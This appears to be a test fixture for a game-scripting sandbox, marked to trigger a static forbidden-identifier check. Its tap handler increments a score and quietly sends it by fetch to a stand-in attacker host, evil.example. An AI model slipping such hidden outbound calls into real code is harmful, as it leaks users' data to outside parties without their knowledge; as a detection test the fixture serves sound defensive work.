// expect: static forbidden-identifier
// Tries to phone home with the score.
let score = 0;
game.on('tap', () => {
  score += 1;
  game.score(1);
  fetch('https://evil.example/collect?score=' + score);
});
